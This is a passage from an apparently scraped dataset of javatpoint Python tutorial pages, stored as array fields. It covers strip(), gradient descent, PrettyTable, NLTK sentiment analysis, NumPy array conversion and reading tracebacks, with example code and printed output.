function used?', 'Conclusion:']",[],"['Return value: It returns a copy of the original string by removing the set of characters or whitespaces from the original string.', ""Let's consider an example to perform the strip() function by removing the leading or trailing characters from a given string in Python."", ""Let's consider an example to perform the strip() function by removing the leading or trailing whitespace from a given string in Python."", 'Following are the reason to use the python strip function:']","['In the above program, we use the strip() function to remove whitespaces from starting and ending of the given string, but it does not remove whitespace in between the strings.']","['In the above topic, we have learned about the strip() function of the Python Library. It is a strip() function used to remove the characters or spaces from start and end of the original string. But, if the user does not pass any character to the strip() function, it only removes the whitespaces from leading and trailing of the main string.']","[""strip( 'characters' )"", 'strinput = ""  $$$$$  No. 1 Welcome to JAVATPOINT!! No. 1 $$$ ""', '# use strip() function to remove the set of characters', ""res = strinput.strip ( ' $No. 10 !' ) # store result into res variable"", 'print ( "" Given string is: "", strinput)', 'print ( "" After removing the set of characters: "", res)', ""str3 = ' 1 11 111 111 1111 Learn Python Programming Tutorial 1111 111 11 1 '"", ""str4 = str3. strip ( '1' )"", 'print ("" \\n  Given string is "", str3)', 'print ("" Stripping 1 from both ends of the string using strip (\'1\') function "", str4)', '# define new string', ""str5 = '++++++Python Programming Tutorial****** $$$$$'"", 'print (""\\n Given string is = "", str5)', '# use strip function to remove the symbols from both ends', ""str6 = str5. strip ( ' $*+' )"", 'print ("" Stripping the \'+\', \'*\' and \'$\' symbols on both sides of the string is = "", str6)', ""str1 = '   Welcome to the World!              '"", '# print the original string', ""print (' Given string is: ', str1)"", '# use strip() function to remove whitespace', 'str2 = str1.strip()', 'print("" After removing whitespaces from an original string: "", str2)', ""str3 = '             Learn    Python    programming          '"", '# print the original string', ""print (' Given string is: ', str3)"", '# use strip() function to remove whitespace', 'str4 = str3.strip()', 'print("" After removing whitespaces from an original string: "", str4)', 'str1 = input( "" Enter the string "") # take a string', 'print ("" Your string is "", str1)', 'ch = input ("" Enter any character or symbol that you don\'t want to see in the string "")', 'res = str1.strip (ch)', '# print the string after using a strip() method', 'print ("" After performing the strip() function, \\n Your string is "", res)']","['Given string is:    $$$$$  No. 1 Welcome to JAVATPOINT!! No. 1 $$$', 'After removing the set of characters:  Welcome to JAVATPOINT', 'Given string is   1 11 111 111 1111 Learn Python Programming Tutorial 1111 111 11 1', ""Stripping 1 from both ends of the string using strip ('1') function   1 11 111 111 1111 Learn Python"", 'Programming Tutorial 1111 111 11 1', 'Given string is =  ++++++Python Programming Tutorial****** $$$$$', ""Stripping the '+', '*' and '$' symbols on both sides of the string is =  Python Programming Tutorial"", 'Given string is:     Welcome to the World!', 'After removing whitespaces from an original string:  Welcome to the World!', 'Given string is:               Learn    Python    programming', 'After removing whitespaces from an original string:  Learn    Python    programming', 'Enter the string *** $$ Welcome to JavaTpoint. Learn Python programming !!! &&', 'Your string is  *** $$ Welcome to JavaTpoint. Learn Python programming !!! &&', ""Enter any character or symbol that you don't want to see in the string * $ Wel ! &"", 'After performing the strip() function,', 'Your string is  come to JavaTpoint. Learn Python programming']",[],"[""|||strip ('chars'): A strip() parameter is an optional parameter. So, if the programmer does not pass any parameter to strip() function, it removes the starting and ending whitespaces from the strings.|||If the set of a given parameter is passed to the strip() function, it removes the characters or symbols from the original string.||||||It helps to remove the characters from the leading and trailing of the original string based on the passed characters to the strip() function.|||If the user does not pass any character to the strip function, by default, it removes only the white space from both ends of the string.|||If there is no white space at the starting or end of the original string, it returns the original string without modifying it.|||If the passed character is not matched with the original string, the strip function returns the original string.|||""]"
225,['Gradient Descent Algorithm'],['The Gradient Descent is an optimization algorithm which is used to minimize the cost function for many machine learning algorithms. Gradient Descent algorithm is used for updating the parameters of the learning models. '],"['https://www.javatpoint.com/prettytable-in-python', 'https://www.javatpoint.com/strip-function-in-python', 'https://www.javatpoint.com/prettytable-in-python', 'https://www.javatpoint.com/strip-function-in-python', 'https://www.javatpoint.com/prettytable-in-python']",[],[],"['Algorithm used for batch gradient descent:', 'Algorithm used for mini-batch gradient descent', 'Conclusion']","['Variables used:', 'Algorithm used for stochastic gradient descent:']",[],"['Following are the different types of Gradient Descent:', ""Let 'k' be the number of training datasets."", ""Let 'j' be the number of features in the dataset."", ""If p == k, the mini-batch gradient descent will behave similarly to the batch gradient descent. (where 'p' is batch gradient descent)"", 'Let hθ(a) be the hypothesis for linear regression. Then the cost function will be given by:', 'Let Σ represents the sum of all the training datasets from t = 1 to k.', ""Suppose 'p' is the number of datasets in one batch, where p < k."", 'Let p = 10 and k = 100;', 'However the users can adjust the batch size. This is generally written as a power of 2.', 'In this tutorial, we have discussed about the different types of Gradient Descent algorithms and their variants.']","['Repeat { \r\n   For t = 1, 11, 21, ….., 91\r\n      \r\n\t  Let Σ be the summation from t to t+9 represented by d. \r\n\t  \r\n\t  Θg = θg - (learning rate/size of (p)) * Σ (hθ(a(d)) - b(d))ag(d)\r\n\t    For every g = 0 …j\r\n}\r\n']","[""Where ag(t) represents the gth feature of the t th training dataset, suppose if 'k' is very large (for example, 7 million number of training datasets), then batch gradient descent will take hours or maybe days for completing the process. Therefore, for large training datasets, batch gradient descent is not recommended to the users as this will slows down the learning process of the machine.""]","['Gtrain(θ) = (1/2k) Σ (hθ(a(t)) - b(t))2', 'Repeat {', 'θg = θg - (learning rate/k) * Σ (hθ(a(t)) - b(t))ag(t)', 'For every g = 0 …j', 'Repeat {', 'For t = 1, 11, 21, ….., 91', 'Let Σ be the summation from t to t+9 represented by d.', 'Θg = θg - (learning rate/size of (p)) * Σ (hθ(a(d)) - b(d))ag(d)', 'For every g = 0 …j', 'Let (a(t), b(t)) be the training dataset', 'Cost(θ, (a(t), b(t))) = (1/2) Σ (hθ(a(t)) - b(t))2', 'Gtrain(θ) = (1/k) Σ Cost (θ, (a(t), b(t)))', 'Repeat {', 'For t = 1 to k{', 'Θg = θg - (learning rate) * Σ (hθ(a(t)) - b(t))ag(t)', 'For every g = 0 …j']","['Gtrain(θ) = (1/2k) Σ (hθ(a(t)) - b(t))2', 'Repeat {', 'θg = θg - (learning rate/k) * Σ (hθ(a(t)) - b(t))ag(t)', 'For every g = 0 …j', '}', 'Repeat {', 'For t = 1, 11, 21, ….., 91', '', 'Let Σ be the summation from t to t+9 represented by d.', '', 'Θg = θg - (learning rate/size of (p)) * Σ (hθ(a(d)) - b(d))ag(d)', 'For every g = 0 …j', '}', 'Hence,', 'Let (a(t), b(t)) be the training dataset', 'Cost(θ, (a(t), b(t))) = (1/2) Σ (hθ(a(t)) - b(t))2', 'Gtrain(θ) = (1/k) Σ Cost (θ, (a(t), b(t)))', 'Repeat {', 'For t = 1 to k{', 'Θg = θg - (learning rate) * Σ (hθ(a(t)) - b(t))ag(t)', 'For every g = 0 …j', '', '}', '}']",[],"[""|||Batch Gradient Descent: The Batch Gradient Descent is the type of Gradient Algorithm that is used for processing all the training datasets for each iteration of the gradient descent. Suppose the number of the training dataset is large, the batch gradient descent will be comparatively expensive. Hence, if the number of the training dataset is large, the users are not advised to use batch gradient descent. Instead, they can use mini-batch gradient descent for a large training dataset.|||Mini-Batch Gradient Descent: The mini-batch gradient descent is the type of gradient descent that is used for working faster than the other two types of gradient descent. Suppose the user has 'p' (where 'p' is batch gradient descent) dataset where p < m (where 'm' is mini-batch gradient descent) will be processed per iteration. So, even if the number of 'p' training dataset is large, the mini-batch gradient descent will process it in batches of 'p' training datasets in a single attempt. Therefore, it can work for large training datasets with fewer numbers of iterations.|||Stochastic Gradient Descent: Stochastic gradient descent is the type of gradient descent which can process one training dataset per iteration. Therefore, the parameters will be updated after each iteration, in which only one dataset has been processed. This type of gradient descent is faster than the Batch Gradient Descent. But, if the number of training datasets is large then also, it will process only one dataset at a time. Therefore, the number of iterations will be large.||||||This gradient descent will randomly shuffle the dataset for training the parameters for each kind of data.|||The stochastic gradient descent will take only one dataset per iteration.|||""]"
226,['Prettytable in Python'],"['In this tutorial, we will learn to create a relational table using the Python Prettytable module. We will create tables without using external libraries.']","['https://www.javatpoint.com/convert-python-list-to-numpy-arrays', 'https://www.javatpoint.com/gradient-descent-algorithm', 'https://www.javatpoint.com/convert-python-list-to-numpy-arrays', 'https://www.javatpoint.com/gradient-descent-algorithm', 'https://www.javatpoint.com/convert-python-list-to-numpy-arrays']",[],[],"['What is Pretty Table?', 'Create Table using Pretty Table', 'PrettyTable Deleting Rows', 'Getting Particular Rows and Columns', 'Changing the Alignment of Column', 'Changing the Appearance of Table', 'Conclusion']",['Installation'],[],"[""Here, we will create the row-wise table using the pretty table module. Let's understand the following example."", 'Example - 1: Creating table row wise', 'Example - 2: Column Wise Table', 'We have used the add_column() method of pretty table module.', 'Example - 2: Add Rows in Once', 'It will remove the specific rows from the table. To clear the entire table, we use the following method.', 'Example - 2', 'As we can see in the above code, all the rows have been deleted. We can only see the column names.', 'The main aim of prettytable is to get the tables in ASCII form. We can restrict the output of the table using the following method.', ""Let's understand the following example."", 'The field argument takes the list of the field names to be printed.', 'We can also use the following method to control the result.', ""Let's see the following example."", ""Let's see the following example."", 'Example - Add the following code in the create table code.', 'We can clearly see the difference between the default table and MSWord friendly table.']","[""This module provides the del_row() method which allows us to removes rows. It takes the index value that to be deleted and remove the rows. The indexing starts from zero. Let's understand the following code."", 'The default table looks like an SQL database shell. However, we can modify the table appearance in the other format. The pretty table module provides the set_style() method, transforming the Table in the MSWord friendly.', 'We have discussed some important operations in table using the prettytable module. This is a very effective module to work with table using the Python script.']","['Pretty tables are the visual representation of the data in tabular forms. These are ASCII tables and easy to use. The prettytable library consists of the PrettyTable class, which is used to create relational tables. To work with this library, we need to install it using the below command.', ""We can observe that all the columns in the Table are aligned center. We can change it according to the requirement by assigning one character to align the attribute. There are three strings - 'l' (for left), 'r' (for right) and 'c'(for center) alignment, respectively.""]","['pip install prettytable', 'from prettytable import PrettyTable', '# Creating a new table', 'newTable = PrettyTable([""Student Name"", ""Class"", ""Subject"", ""Makrs""])', '# Add rows', 'newTable.add_row([""Camron"", ""X"", ""English"", ""91""])', 'newTable.add_row([""Haris"", ""X"", ""Math"", ""63""])', 'newTable.add_row([""Jenny"", ""X"", ""Science"", ""90""])', 'newTable.add_row([""Bernald"", ""X"", ""Art"", ""92""])', 'newTable.add_row([""Jackson"", ""X"", ""Science"", ""98""])', 'newTable.add_row([""Samual"", ""X"", ""English"", ""88""])', 'newTable.add_row([""Stark"", ""X"", ""English"", ""95""])', 'print(newTable)', 'from prettytable import PrettyTable', 'columns = [""Student Name"", ""Class"", ""Subject"", ""Marks""]', 'newTable = PrettyTable()', '# Add Columns', 'newTable.add_column(columns[0], [""Jacob"", ""Peter"", ""Grenger"",', '""Stark"", ""Falcon"", ""Matthew"", ""Jackson""])', 'newTable.add_column(columns[1], [""X"", ""X"", ""X"", ""X"", ""X"", ""X"", ""X""])', 'newTable.add_column(columns[2], [""English"", ""Art"", ""Science"", ""Math"", ""Science"", ""English"", ""English""])', 'newTable.add_column(columns[3], [""91"", ""63"", ""90"", ""92"",', '""98"", ""83"", ""95""])', 'print(newTable)', 'from prettytable import PrettyTable', '# Creating a new table', 'newTable = PrettyTable([""Student Name"", ""Class"", ""Subject"", ""Makrs""])', '# # Add rows', 'newTable.add_rows(', '[""Camron"", ""X"", ""English"", ""91""],', '[""Haris"", ""X"", ""Math"", ""63""],', '[""Jenny"", ""X"", ""Science"", ""90""],', '[""Bernald"", ""X"", ""Art"", ""92""],', '[""Jackson"", ""X"", ""Science"", ""98""],', '[""Samual"", ""X"", ""English"", ""88""],', '[""Stark"", ""X"", ""English"", ""95""],', 'print(newTable)', 'from prettytable import PrettyTable', '# Creating a new table', 'newTable = PrettyTable([""Student Name"", ""Class"", ""Subject"", ""Makrs""])', '# # Add rows', 'newTable.add_row([""Camron"", ""X"", ""English"", ""91""])', 'newTable.add_row([""Haris"", ""X"", ""Math"", ""63""])', 'newTable.add_row([""Jenny"", ""X"", ""Science"", ""90""])', 'newTable.add_row([""Bernald"", ""X"", ""Art"", ""92""])', 'newTable.add_row([""Jackson"", ""X"", ""Science"", ""98""])', 'newTable.add_row([""Samual"", ""X"", ""English"", ""88""])', 'newTable.add_row([""Stark"", ""X"", ""English"", ""95""])', 'newTable.del_row(1)', 'newTable.del_row(2)', 'newTable.del_row(3)', 'print(newTable)', 'myTable.clear_rows()', 'from prettytable import PrettyTable', '# Creating a new table', 'newTable = PrettyTable([""Student Name"", ""Class"", ""Subject"", ""Makrs""])', '# # Add rows', 'newTable.add_row([""Camron"", ""X"", ""English"", ""91""])', 'newTable.add_row([""Haris"", ""X"", ""Math"", ""63""])', 'newTable.add_row([""Jenny"", ""X"", ""Science"", ""90""])', 'newTable.add_row([""Bernald"", ""X"", ""Art"", ""92""])', 'newTable.add_row([""Jackson"", ""X"", ""Science"", ""98""])', 'newTable.add_row([""Samual"", ""X"", ""English"", ""88""])', 'newTable.add_row([""Stark"", ""X"", ""English"", ""95""])', 'newTable.clear_rows()', 'print(newTable)', 'get_string(fields=[""Column 1"", ""Column2"", .............., ColumnN]', 'from prettytable import PrettyTable', '# Creating a new table', 'newTable = PrettyTable([""Student Name"", ""Class"", ""Subject"", ""Makrs""])', '# # Add rows', 'newTable.add_rows(', '[""Camron"", ""X"", ""English"", ""91""],', '[""Haris"", ""X"", ""Math"", ""63""],', '[""Jenny"", ""X"", ""Science"", ""90""],', '[""Bernald"", ""X"", ""Art"", ""92""],', '[""Jackson"", ""X"", ""Science"", ""98""],', '[""Samual"", ""X"", ""English"", ""88""],', '[""Stark"", ""X"", ""English"", ""95""],', 'print(newTable.get_string(fields=[""Student Name"", ""Class""]))', 'print(newTable.get_string(start=1, end=4)', ""newTable.align = 'r'"", 'print(newTable)', 'from prettytable import MSWORD_FRIENDLY', 'newTable.set_style(MSWORD_FRIENDLY)', 'print(newTable)']","['+--------------+-------+---------+-------+', '| Student Name | Class | Subject | Makrs |', '+--------------+-------+---------+-------+', '|    Camron    |   X   | English |   91  |', '|    Haris     |   X   |   Math  |   63  |', '|    Jenny     |   X   | Science |   90  |', '|   Bernald    |   X   |   Art   |   92  |', '|   Jackson    |   X   | Science |   98  |', '|    Samual    |   X   | English |   88  |', '|    Stark     |   X   | English |   95  |', '+--------------+-------+---------+-------+', '+--------------+-------+---------+-------------------+', '| Student Name | Class | Subject | Marks |', '+--------------+-------+---------+-------------------+', '|    Jacob             |   X     | English |   91    |', '|    Peter             |   X     |   Art   |   63    |', '|   Grenger            |   X     | Science |   90    |', '|    Stark             |   X     |   Math  |   92    |', '|    Falcon            |   X     | Science |   98    |', '|   Matthew            |   X     | English |   83    |', '|   Jackson            |   X     | English |   95    |', '+--------------+-------+---------+------------------+', '+--------------+-------+---------+-------+', '|    Camron    |   X   | English |   91  |', '|    Haris     |   X   |   Math  |   63  |', '|    Jenny     |   X   | Science |   90  |', '|   Bernald    |   X   |   Art   |   92  |', '|   Jackson    |   X   | Science |   98  |', '|    Samual    |   X   | English |   88  |', '|    Stark     |   X   | English |   95  |', '+--------------+-------+---------+-------+', '+--------------+-------+---------+-------+', '| Student Name | Class | Subject | Makrs |', '+--------------+-------+---------+-------+', '|    Camron          |   X   | English |   91   |', '|    Jenny               |   X   | Science |   90  |', '|   Jackson            |   X   | Science |   98  |', '|    Stark                |   X   | English |   95  |', '+--------------+-------+---------+-------+', '+--------------+-------+---------+------------------+', '| Student Name | Class | Subject | Makrs |', '+--------------+-------+---------+--------------------+', '+--------------+-------+---------+--------------------+', '+--------------+--------------+', '| Student Name | Class |', '+--------------+--------------+', '|    Camron          |   X   |', '|    Haris               |   X   |', '|    Jenny               |   X   |', '|   Bernald            |   X   |', '|   Jackson            |   X   |', '|    Samual            |   X   |', '|    Stark                |   X   |', '+--------------+---------------+', '+--------------+-------+---------+-------------------+', '| Student Name | Class | Subject | Makrs |', '+--------------+-------+---------+-------------------+', '|    Camron          |   X   | English |   91  |', '|    Haris               |   X   |   Math  |   63  |', '|    Jenny             |   X   | Science |   90  |', '+--------------+-------+---------+------------------+', '+--------------+-------+---------+-------------------+', '| Student Name | Class | Subject | Makrs |', '+--------------+-------+---------+------------------+', '|           Camron |     X | English |    91  |', '|             Haris  |     X |    Math |    63 |', '|             Jenny |     X | Science |    90 |', '|            Bernald |     X |     Art |    92 |', '|           Jackson |     X | Science |    98 |', '|           Samual  |     X | English |    88 |', '|            Stark     |     X | English |    95 |', '+--------------+-------+---------+------------------+', '| Student Name | Class | Subject | Makrs |', '|    Camron         |   X   | English   |       91  |', '|    Haris              |   X   |   Math     |   63  |', '|    Jenny              |   X   | Science   |   90  |', '|   Bernald           |   X   |   Art         |   92  |', '|   Jackson           |   X   | Science   |   98  |', '|    Samual           |   X   | English   |   88  |', '|    Stark               |   X   | English   |   95  |']",[],[]
227,['Sentiment Analysis in Python'],"['In this article, we will discuss sentiment analysis in Python. This application proves again that how versatile this programming language is. But before starting sentiment analysis, let us see what is the background that all of us must be aware of-']","['https://www.javatpoint.com/#', 'https://www.javatpoint.com/precision-handling-in-python', 'https://www.javatpoint.com/#', 'https://www.javatpoint.com/precision-handling-in-python', 'https://www.javatpoint.com/#']","['https://static.javatpoint.com/python/images/sentiment-analysis-in-python1.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python2.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python3.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python4.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python5.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python6.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python7.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python8.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python9.png', 'https://static.javatpoint.com/python/images/sentiment-analysis-in-python10.png']",[],['Sentiment Analysis'],[],[],"[""So, here we'll discuss-"", 'Let us start with Natural Language Processing-', 'So, this was all about Natural Language Processing, now let us see how the open-source tool Natural Language Processing Toolkit can help us.', 'Now, the next task is to classify our text which can be done using the Naïve Bayes Algorithm, so let us understand how does it work?', 'The principle of this supervised algorithm is based on Bayes Theorem and we use this theorem to find the conditional probability.', 'The Bayes theorem is represented by the given mathematical formula-', 'P(A|B) = P(B|A)*P(A)/P(B)', 'P(A|B)(Posterior Probability) - Probability of occurrence of event A when event B has already occurred.', 'P(B|A)(Likelihood Probability) - Probability of occurrence of event B when event A has already occurred', 'P(A)(Prior)- Probability of occurrence of event A.', 'P(B)(Marginal)-Probability of occurrence of event B.', ""After knowing the pre-requisites let's try to understand in detail that what sentiment analysis is all about and how we can implement this in Python?"", 'Sentiment analysis is used to detect or recognize the sentiment which is contained in the text.', 'This analysis helps us to get the reference of our text which means we can understand that the content is positive, negative, or neutral.', 'Following are the steps involved in the process of sentiment analysis-', 'Let us understand this with the help of an example-', 'Here we have taken some sentences in our training dataset(x_train) and values 0 and 1 in y_train where 1 denotes positive and 0 denotes negative.', '2. The next step is to import the required libraries that will help us to implement the major processes involved in natural language processing.', 'Let us understand what the processes Tokenization, Stemming & Stopwords-', '3. The next step is to create objects of tokenizer, stopwords, and PortStemmer.', 'We want to concatenate the words so we will use regex and pass \\w+ as a parameter.', ""Since we are using the English language, we will specify 'english' as our parameter in stopwords."", '4. The next step is to create a function that will clean our data.', 'We will convert our text into lower case and then implement tokenization.', 'In the given function, we are performing tokenization and stopword removal at the same time. (token for token in tokens if token not in en_stopwords)', 'The next thing is to perform stemming and then join the stemmed tokens.', '5. Following is our x_test data which will be used for cleaning purposes.', '6. In this step, we have taken our data from X_train and X_test and cleaned it.', '7. When we want to check how our clean data looks, we can do it by typing X_clean-', '8. Before going for classification, it is important to perform vectorization to get the desired format. For that, we have to import some libraries.', '9. Feature Names help us to know that what the values 0 and 1 represent. It can be done using-', '10. Now to perform text classification, we will make use of Multinomial Naïve Bayes-', 'On prediction, it gives us the result in the form of array[1,0] where 1 denotes positive in our test set and 0 denotes negative.', 'So, in this article, we discussed the pre-requisites for understanding Sentiment Analysis and how it can be implemented in Python.']","['This is a platform that we use to write Python programs that can be applied for implementing all the pre-processing stages of natural language processing.', 'Looking at the current scenario, all the business tycoons need to have a lucid idea of what kind of response their product is receiving from the customers and how the changes can be incorporated based on the arising demands.']","['To put it in simple words we can say that computers can understand and process the human language. The objective here is to obtain useful information from the textual data. The raw data which is given as an input undergoes various stages of processing so that we perform the required operations on it.', 'In the stage of data cleaning, we obtain a list of words which is called clean text. Some of the steps involved in this are tokenization, stop word removal, stemming, and vectorization (processing of converting words into numbers), and then finally we perform classification which is also known as text tagging or text categorization, here we classify our text into well-defined groups.']","['X_train=[""JavaTpoint provides best tutorial for students"",', '""It is a great platform to start off your IT career"",', '""Concepts are explained very well"",', '""The articles have some interesting examples"",', '""Some tutorials are bad"",', '""Their content can confuse students""]', 'y_train=[1,1,1,1,0,0] #1-Positive, 0 -Negative', 'X_train', 'from nltk.tokenize import RegexpTokenizer', 'from nltk.stem.porter import PorterStemmer', 'from nltk.corpus import stopwords', 'import nltk', ""nltk.download('stopwords')"", ""tokenizer=RegexpTokenizer(r'\\w+')"", ""en_stopwords=set(stopwords.words('english'))"", 'ps=PorterStemmer()', 'def getCleanedText(text):', 'text=text.lower()', '#tokenize', 'tokens=tokenizer.tokenize(text)', 'new_tokens=[token for token in tokens if token not in en_stopwords]', 'stemmed_tokens=[ps.stem(tokens) for tokens in new_tokens]', 'clean_text="" "".join(stemmed_tokens)', 'return clean_text', 'X_test=[""The tutorial that was suggested to me was good"", ""Rest of the tutorials were bad""]', 'X_clean=[getCleanedText(j) for j in X_train]', 'Xt_clean=[getCleanedText(j) for j in X_test]', 'X_clean', 'from sklearn.feature_extraction.text import CountVectorizer', 'cv=CountVectorizer(ngram_range=(1,2))', 'X_vect=cv.fit_transform(X_clean).toarray()', 'print(cv.get_feature_names())', 'Xt_vect=cv.transform(Xt_clean).toarray()', 'from sklearn.naive_bayes import MultinomialNB', 'mlb=MultinomialNB()', 'mlb.fit(X_vect,y_train', 'y_pred=mlb.predict(Xt_vect)', 'y_pred']",[],[],"[""|||What is Natural Language Processing?|||What is Natural Language Processing Toolkit?|||Naïve Bayes Algorithm|||Sentiment Analysis|||||||||Importing the dataset.|||The dataset can be obtained from the authentic resources and can be imported into our code editor using read_csv.||||||The next crucial step is to find out the features that influence the sentiment of our objective.|||Once we draw the conclusion based on the visualization, we can move on to the next step which is creating a 'wordclouds'.|||The next step is to classify the reviews into positive and negative.|||Now we will create wordclouds for both the reviews.|||The amount of obtained wordclouds in the dataset can be understood with the help of bar graphs.||||||The model can be built using-||||||First, clean the data and make sure all the preprocessing stages are followed.|||The next step is to split the data frame which contains only the required features.|||Create a bag of words which means go for vectorization where text can be converted into integer matrix.|||Now we will import logistic regression which will implement regression with a categorical variable.|||Now let's split our data into independent variable and target.|||Let's take the training dataset and fit it into the model.|||Next, we can take the test dataset and make the prediction.|||The final task is to test the accuracy of our model using evaluation metrics.||||||||||||Tokenization- It is the process in which our text data is split into smaller parts such as words and phrases.|||Stemming- We know that all the root base words can produce new words by adding prefix and suffix to them and sometimes this can change the real meaning of the root word so stemming is the process where we disintegrate these additions on our root word.|||Stopwords - In the process of stopword removal, we remove the words that are used in forming a sentence and make it sensible and easy to understand for readers. We perform this on our text to obtain the required keywords that help us to analyze the sentiment.|||""]"
228,['Convert Python List to NumPy Arrays'],"['In Python, a list is a linear data structure that may store heterogeneous elements. It does not need to be defined and can shrink and expand as needed. On the other end, a NumPy array is a data structure that may store homogenous elements. It is implemented in Python using the NumPy library. This library is very efficient in handling multi-dimensional arrays. It is also very efficient in handling a huge number of data elements. NumPy arrays use less memory than List data structures. Both the NumPy array and the list can be identified by their index value.']","['https://www.javatpoint.com/traceback-in-python', 'https://www.javatpoint.com/prettytable-in-python', 'https://www.javatpoint.com/traceback-in-python', 'https://www.javatpoint.com/prettytable-in-python', 'https://www.javatpoint.com/traceback-in-python']","['https://static.javatpoint.com/python/images/convert-python-list-to-numpy-arrays1.png', 'https://static.javatpoint.com/python/images/convert-python-list-to-numpy-arrays2.png', 'https://static.javatpoint.com/python/images/convert-python-list-to-numpy-arrays3.png']",[],['Introduction'],"['Method 1: Using numpy.array()', 'Method 2: Using numpy.asarray()']",[],['The NumPy library provides two methods for converting lists to arrays in Python.'],"['In Python, the simplest way to convert a list to a NumPy array is with numpy.array() function. It takes an argument and returns a NumPy array. It creates a new copy in memory.']","['In Python, the second method is numpy.asarray() function that converts a list to a NumPy array. It takes an argument and converts it to the NumPy array. It does not create a new copy in memory. In this, all changes made to the original array are reflected on the NumPy array.']","['# importing library of the array in python', 'import numpy', '# initilizing elements of the list', 'a = [1, 2, 3, 4, 5, 6, 7, 8, 9]', '# converting elements of the list into array elements', 'arr = numpy.array(a)', '# displaying elements of the list', 'print (""List: "", a)', '# displaying elements of the array', 'print (""Array: "", arr)', '# importing library of the array in python', 'import numpy', '# initilizing elements of the list', 'a = [1, 2, 3, 4, 5, 6, 7, 8, 9]', '# converting elements of the list into array elements', 'arr = numpy.asarray(a)', '# displaying elements of the list', 'print (""List:"", a)', '# displaying elements of the array', 'print (""Array: "", arr)', '# importing library of the NumPy array in python', 'import numpy', '# initilizing elements of the list', 'lst = [1, 2, 3, 4, 5, 6, 7, 8, 9]', '# converting elements of the list into array elements', 'arr = numpy.asarray(lst)', '# displaying elements of the list', 'print (""List:"", lst)', '# displaying elements of the array', 'print (""arr: "", arr)', '# made another array out of arr using asarray function', 'arr1 = numpy.asarray(arr)', '#displaying elements of the arr1 before the changes made', 'print(""arr1: "" , arr1)', '#change made in arr1', 'arr1[3] = 23', '#displaying arr1 , arr , list after the change has been made', 'print(""lst: "" , lst)', 'print(""arr: "" , arr)', 'print(""arr1: "" , arr1)']","['List:  [1, 2, 3, 4, 5, 6, 7, 8, 9]', 'Array:  [1 2 3 4 5 6 7 8 9]', 'List:  [1, 2, 3, 4, 5, 6, 7, 8, 9]', 'Array:  [1 2 3 4 5 6 7 8 9]', 'List: [1, 2, 3, 4, 5, 6, 7, 8, 9]', 'arr:  [1 2 3 4 5 6 7 8 9]', 'arr1:  [1 2 3 4 5 6 7 8 9]', 'lst:  [1, 2, 3, 4, 5, 6, 7, 8, 9]', 'arr:  [ 1  2  3 23  5  6  7  8  9]', 'arr1:  [ 1  2  3 23  5  6  7  8  9]']",[],['|||Using numpy.array()|||Using numpy.asarray()|||']
229,['Traceback in Python'],"['Python returns a Traceback when there is an exception raised within the code. The output of Traceback can be pretty irresistible if we view it for the first time or do not know what message it conveys to us. However, the Traceback in the Python programming language has a wealth of data that can support us diagnose and fix the reason for the exception being raised in the code. Depending on what data a traceback in Python delivers is vital in order to become a better Python programmer.']","['https://www.javatpoint.com/time-clock-method-in-python', 'https://www.javatpoint.com/convert-python-list-to-numpy-arrays', 'https://www.javatpoint.com/time-clock-method-in-python', 'https://www.javatpoint.com/convert-python-list-to-numpy-arrays', 'https://www.javatpoint.com/time-clock-method-in-python']",[],[],"['An Introduction to Traceback in Python', 'Understanding the Traceback in the Python programming language', 'Reading a Traceback in Python', 'Understanding Some Common Tracebacks in Python']","['AttributeError', 'ImportError', 'IndexError', 'KeyError', 'NameError', 'SyntaxError', 'TypeError', 'ValueError']","['Note: If some of us are fond of viewing stack traces in different programming languages, then it is a pretty noticeable difference in the way a traceback looks in the Python programming language for comparison. Most of the languages return the exception at the top and then go from top to bottom, most recent calls to least recent.']","[""So, let's get started."", 'Explanation:', 'The Python traceback is divided into different sections. Each section has its importance. Let us consider the following Traceback shown below:', 'Traceback:', 'This exception is raised when the reference or assignment of attribute fails.', 'Let us consider the following example where the AttributeError exception has been raised.', 'Explanation:', 'Let us consider another example for better clarification:', 'Explanation:', 'Let us consider an example demonstrating how the ImportError and ModuleNotFoundError are raised.', 'Explanation:', 'This exception is raised whenever the subscript of a series or sequence is out of range.', 'Let us consider the following example demonstrating how the IndexError exception is raised.', 'Explanation:', 'This exception is raised whenever a dictionary (mapping) key is not found in the set of existing keys.', 'Let us consider the following example to understand how the KeyError exceptions are raised.', 'Explanation:', 'This exception is raised whenever a local or global name is not found.', 'Let us consider the following example in order to understand how the NameError exception is raised.', 'Explanation:', 'This exception is raised whenever the parser encounters an error in Python syntax.', 'Let us consider an example illustrating how the SyntaxError exception is raised.', 'Explanation:', 'This exception is raised whenever a function or an operation is applied to an object of the wrong type.', 'Let us consider the following example demonstrating how the TypeError exception is raised.', 'Explanation:', ""Similarly, this exception is raised when we used the len() function on the 'int' data type."", 'Let us consider the following example illustrating the same.', 'Explanation:', 'Let us consider an example based on the ValueError exception.', 'Explanation:', 'In the above example, we have tried to unpack four values but got only three. Thus, as a result, the program raised the ValueError exception.', 'Let us consider another example based on the ValueError exception.', 'Explanation:']","['In the following tutorial, we will discuss Traceback in the Python programming language. But at the end of the tutorial, we will be able to recognize a few of the most frequent tracebacks.', 'Whenever the program raises an exception, Python returns the current Traceback in order to help us acknowledge what went wrong. Let us consider the following example illustrating one such scenario.', 'In the above traceback, the exception was a NameError, which implies a reference to some name (such as a variable, class, function) that has not been defined. In the following case, the name referred to ""nam"".', 'The last line in the above case has enough data in order to help us fix the issue. Search the code for the name nam, which is misspelled and will indicate us correctly. Generally, the code is a lot more complicated.', 'It is a good practice to read the traceback message from the bottom to the top in the Python programming language. Now, let us understand the above traceback in detail:', 'There are some differences between the output of the traceback when the code is executed in the command-line and the REPL. Let us consider executing the same example in REPL and understand the traceback output.', 'Whereas in Python, a traceback should be read from bottom to top. This is pretty helpful as when the traceback is returned, the terminal usually ends up at the bottom of the output, providing us the perfect place to begin reading the traceback.', 'Once we have understood how to read a Traceback in Python whenever an exception is raised, let us understand some of the common tracebacks that can be seen while coding.', 'Here are some standard exceptions we might encounter, along with their meaning, the reason for them to get raised, and the data we can find in their tracebacks.', 'The exception known as AttributeError is raised while trying to access an attribute on an object that does not have that defined attribute. The documentation of Python describes when the 